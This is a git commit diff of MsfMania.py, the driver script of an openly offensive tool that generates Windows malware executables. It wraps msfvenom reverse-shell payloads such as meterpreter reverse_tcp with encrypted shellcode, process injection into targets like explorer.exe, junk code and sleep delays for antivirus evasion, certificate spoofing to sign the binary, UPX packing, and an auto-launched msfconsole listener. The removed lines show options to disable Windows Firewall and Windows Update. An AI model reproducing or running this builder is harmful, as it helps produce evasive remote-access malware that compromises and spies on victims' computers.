bde5a4eb24267b1f8f5eede65b259507dd1497fd
G1ft3dC0d3 <52042546+G1ft3dC0d3@users.noreply.github.com>
2021-03-08 02:45:50 +0100

    Add files via upload

--- MsfMania.py
+++ MsfMania.py
@@ -1,37 +1,29 @@
-from lib import builder, cert, compiler, core, evasion, gen
+from lib import builder, compiler, core, encryption, evasion
 import argparse
 from os import makedirs, path
 from shutil import which
 from subprocess import call
-from random import randrange
+
 
 types = ""
-architecture = ""
+arch = ""
 payload = ""
 custom_shellcode = ""
 lhost = "lhost="
 lport = "lport="
 msfvenom = []
 filename = ""
-vShellcode = ""
-decoder_stub = ""
 injection_type = ""
-processname = ""
-evasions = ""
+procname = ""
 junkcode = ""
-intensity = 0
-decoys = ""
-windows_defender = ""
-windows_firewall = ""
-windows_update = ""
-require_admin = ""
-icon = ""
-mscript = ""
+sleep = ""
+req_admin = ""
 final_code = ""
+icon = ""
 
 
 def check_requirements():
-    required = ["x86_64-w64-mingw32-windres", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-windres", "i686-w64-mingw32-gcc", "rar", "msfvenom", "osslsigncode"]
+    required = ["x86_64-w64-mingw32-windres", "x86_64-w64-mingw32-gcc", "i686-w64-mingw32-windres", "i686-w64-mingw32-gcc", "rar", "msfvenom", "osslsigncode", "upx"]
     to_install = ["mingw-w64", "rar", "metasploit-framework", "osslsigncode"]
     not_installed = []
     for i in required:
@@ -46,23 +38,28 @@ def check_requirements():
 
 
 def check_directory():
-    directories = ["./output", "./tmp"]
+    directories = ["./output", "./tmp", "./icon"]
     for i in directories:
         if not path.isdir(i):
             makedirs(i)
 
 
 def check_payload_requirements():
-    if args.lhost:
-        if args.lport:
-            if args.injectiontype:
-                pass
+    if args.payload:
+        if args.lhost:
+            if args.lport:
+                if args.injectiontype:
+                    pass
+                else:
+                    core.error_payload_injectiontype()
             else:
-                core.error_payload_injectiontype()
+                core.error_payload_lport()
         else:
-            core.error_payload_lport()
+            core.error_payload_lhost()
+    elif args.shellcustom:
+        pass
     else:
-        core.error_payload_lhost()
+        core.error_payload_required()
 
 
 def staged_or_no():
@@ -73,8 +70,16 @@ def staged_or_no():
         return "no"
 
 
+def check_payload():
+    if args.payload:
+        tpayload = str(args.payload)
+        return tpayload
+    else:
+        return ""
+
+
 def check_customopt():
-    msfcommand = ['msfvenom', '-a', architecture, '--platform', 'windows', '-p', payload, lhost, lport, '--smallest', '-f', 'c']
+    msfcommand = ['msfvenom', '-a', arch, '--platform', 'windows', '-p', payload, lhost, lport, '-f', 'c']
     if args.msfcustom:
         customopt = args.msfcustom
         customopt = customopt.split(" ")
@@ -85,78 +90,41 @@ def check_customopt():
         return msfcommand
 
 
-def check_injectiontype():
-    it = args.injectiontype
-    if it == "remote":
-        if architecture == "x86":
-            core.warning_injectionType()
-            return "local"
-        else:
-            return it
-    else:
-        return it
-
-
 def check_procname():
-    if args.procname:
-        procname = args.procname
-        if ".exe" in procname:
-            if len(procname) > 4:
-                return procname
-            else:
-                core.error_procname(procname)
+    injtype = str(args.injectiontype)
+    if injtype == "remote":
+        if args.procname:
+            procn = str(args.procname)
+            return procn
         else:
-            core.error_procname(procname)
-    else:
-        return "explorer.exe"
+            core.error_injectiontype()
+    elif injtype == "hijack":
+        if args.procname:
+            procn = str(args.procname)
+            return procn
+        else:
+            core.error_injectiontype()
+
+    elif injtype == "local":
+        return ""
 
 
-def check_evasion():
-    if args.evasion:
-        return "yes"
-    else:
-        return "no"
-
-
-def check_junkcode():
+def junkcode_check():
     if args.junk:
-        return "yes"
-    else:
-        return "no"
-
-
-def check_intensity():
-    if args.intensity:
-        H = int(args.intensity)
-        if H >= 7:
-            return H
-        else:
-            H = randrange(1, 6)
-            return H
-    else:
-        return randrange(1, 6)
-
-
-def check_decoy():
-    if args.decoy:
-        decoy = args.decoy
-        return str(decoy)
+        add_junk = "yes"
+        return add_junk
     else:
         return ""
 
 
-def check_win_fwl():
-    if args.winfwl:
-        return "disable firewall"
+def check_sleep():
+    if args.sleep:
+        mseconds = str(args.sleep) + "000"
+        sleep_stub = evasion.sleeper(mseconds)
+        core.sleep_added(str(args.sleep))
+        return sleep_stub
     else:
-        return "no"
-
-
-def check_win_upt():
-    if args.winupt:
-        return "disable winupdate"
-    else:
-        return "no"
+        return ""
 
 
 def check_admin():
@@ -171,7 +139,7 @@ def check_spoof():
         remote_cert = args.spoof
         if ":" in remote_cert:
             remote_cert = remote_cert.split(":")
-            cert.spoofer(remote_cert[0], remote_cert[1], filename, "output/malware.exe")
+            evasion.spoofer(remote_cert[0], remote_cert[1], filename, "output/malware.exe")
         else:
             core.bad_certificate()
     else:
@@ -179,9 +147,8 @@ def check_spoof():
 
 
 def write_file():
-    with open('tmp/source.cpp', 'w') as f:
+    with open('tmp/source.c', 'w') as f:
         f.write(final_code)
-    return ""
 
 
 def check_icon():
@@ -201,6 +168,13 @@ def check_icon():
         return ""
 
 
+def check_upx():
+    if args.upx:
+        compiler.upx(filename)
+    else:
+        return "no"
+
+
 def check_compression():
     if args.compress:
         compiler.rar(filename)
@@ -208,9 +182,27 @@ def check_compression():
         return "no"
 
 
+def check_file_size():
+    fs = path.getsize(filename)
+    return fs
+
+
+def file_size():
+    if args.upx:
+        core.packed_file_changes(original_file_size, packed_file_size)
+    else:
+        core.file_size(original_file_size)
+
+
+def check_hashfile():
+    if args.hash:
+        hash_type = args.hash
+        compiler.hash_file(filename, hash_type)
+
+
 def check_mscript():
     if args.mscript:
-        core.mscript(architecture, types, payload, lhost, lport)
+        core.mscript(payload, lhost, lport)
     else:
         return ""
 
@@ -221,52 +213,48 @@ if __name__ == '__main__':
     check_directory()
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("-a", "--arch", help="Choose payload architecture", choices=["x86", "x64"], required=True)
-    parser.add_argument("-p", "--payload", help="Choose the metasploit payload (exemple: windows/x64/meterpreter/reverse_tcp)", required=False)
-    parser.add_argument("-lh", "--lhost", help="Set your lhost (exemple: 192.168.1.60)", required=False)
-    parser.add_argument("-lp", "--lport", help="Set your lport (exemple: 4444)", required=False)
-    parser.add_argument("-cO", "--msfcustom", help="Set your own msfvenom option (exemple: -cO='-e x64/xor_dynamic'", required=False)
-    # parser.add_argument("-cS", "--customshell", help="Set your own shellcode", required=False)
-    #  parser.add_argument("-cC", "--customshell", help="Set your custom cmd/powershell command", required=False)
-    parser.add_argument("-o", "--filename", help="Choose the name of the output file (exemple: Malware)", required=True)
-    parser.add_argument("-it", "--injectiontype", help="Set injection method (remote only for x64 architechture)", choices=["local", "remote"], required=True)
-    parser.add_argument("-pn", "--procname", help="Choose process to inject shellcode for remote injection method (default/exemple: explorer.exe)", required=False)
-    parser.add_argument("-e", "--evasion", help="Addition of functions that allow antivirus evasion", action='store_true', required=False)
-    parser.add_argument("-j", "--junk", help="Injects junkcode into the main structure and functions present", action='store_true', required=False)
-    parser.add_argument("-ji", "--intensity", help="Injects junkcode into the main structure and functions present", required=False)
-    parser.add_argument("-d", "--decoy", help="Number of decoys to add (unlimited)  -  PS : 1 decoy = 1 secondes to sleep.", required=False)
-    # parser.add_argument("-lb", "--logicbomb", help="The shellcode will be executed on a given date (exemple: 24:12:2025).", required=False)
-    parser.add_argument("-wf", "--winfwl", help="Disable Windows Firewall", action='store_true', required=False)
-    parser.add_argument("-wu", "--winupt", help="Disable Windows Update", action='store_true', required=False)
-    parser.add_argument("-A", "--admin", help="Administrator privileges are required to run the program", action='store_true', required=False)
-    parser.add_argument("-sc", "--spoof", help="Creates a spoofed certificate of any online website and signs an Executable (exemple: www.test.com:44)", required=False)
-    parser.add_argument("-i", "--icon", help="Add your icon to EXE file (exemple: my_icon_name.ico)", required=False)
-    parser.add_argument("-c", "--compress", help="Compress EXE file to RAR)", action='store_true', required=False)
-    parser.add_argument("-ms", "--mscript", help="Run pre-configured MsfConsole", action='store_true', required=False)
+    parser.add_argument("-a", "--arch", help="Choose payload arch.", choices=["x86", "x64"], required=True)
+    parser.add_argument("-p", "--payload", help="Choose the metasploit payload (ex: windows/x64/meterpreter/reverse_tcp).", required=False)
+    parser.add_argument("-lh", "--lhost", help="Set your lhost (ex: 192.168.1.60).", required=False)
+    parser.add_argument("-lp", "--lport", help="Set your lport (ex: 4444).", required=False)
+    parser.add_argument("-cO", "--msfcustom", help="Set your own msfvenom option (ex: -cO='-e x64/xor_dynamic'.", required=False)
+    parser.add_argument("-o", "--filename", help="Choose the name of the output file (ex: Malware).", required=True)
+    parser.add_argument("-it", "--injectiontype", help="Set injection method (remote only for x64 architechture.)", choices=["local", "remote", "hijack"], required=True)
+    parser.add_argument("-pn", "--procname", help="Choose process to inject shellcode for remote injection method (default/ex: explorer.exe).", required=False)
+    parser.add_argument("-j", "--junk", help="Inject junkcode everywhere.", action='store_true', required=False)
+    parser.add_argument("-s", "--sleep", help="Indicate the number of seconds to sleep before the execution of the payload and command.", required=False)
+    parser.add_argument("-A", "--admin", help="Administrator privileges are required to run the program.", action='store_true', required=False)
+    parser.add_argument("-sc", "--spoof", help="Creates a spoofed certificate of any online website and signs the PE (ex: www.test.com:443).", required=False)
+    parser.add_argument("-i", "--icon", help="Add your icon to PE file (ex: my_icon_name.ico).", required=False)
+    parser.add_argument("--upx", help="Pack PE file with UPX.", action='store_true', required=False)
+    parser.add_argument("--compress", help="Compress PE file with RAR.", action='store_true', required=False)
+    parser.add_argument("--hash", help="Get hash file.", choices=["sha256", "md5"], required=False)
+    parser.add_argument("-ms", "--mscript", help="Run pre-configured MsfConsole.", action='store_true', required=False)
     args = parser.parse_args()
 
     check_payload_requirements()
     types += staged_or_no()
-    architecture += str(args.arch)
-    payload += str(args.payload)
+    arch += str(args.arch)
+    payload += check_payload()
     lhost += str(args.lhost)
     lport += str(args.lport)
     msfvenom += check_customopt()
-    vShellcode, decoder_stub = gen.shellcode_generation(msfvenom, junkcode, intensity)
+    vshellcode, decoder_stub = encryption.shellcode_generation(msfvenom)
     filename += "output/" + str(args.filename) + ".exe"
-    injection_type += check_injectiontype()
-    processname += check_procname()
-    evasions += check_evasion()
-    junkcode += check_junkcode()
-    intensity += check_intensity()
-    decoys += check_decoy()
-    windows_firewall += check_win_fwl()
-    windows_update += check_win_upt()
-    require_admin += check_admin()
-    final_code += builder.exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, junkcode, intensity, evasions, decoys, windows_firewall, windows_update, filename)
-    file = write_file()
+    injection_type += str(args.injectiontype)
+    procname += check_procname()
+    junkcode += junkcode_check()
+    sleep += check_sleep()
+    req_admin += check_admin()
+    final_code += builder.exercise_room(arch, injection_type, procname, filename, junkcode, sleep, vshellcode, decoder_stub)
+    write_file()
     icon += check_icon()
-    compiler.auto_compile(filename, architecture, icon, require_admin)
-    certificate = check_spoof()
-    compression = check_compression()
-    mscript = check_mscript()
+    compiler.auto_compile(filename, arch, icon, req_admin)
+    original_file_size = check_file_size()
+    check_spoof()
+    check_upx()
+    packed_file_size = check_file_size()
+    file_size()
+    check_compression()
+    check_hashfile()
+    check_mscript()
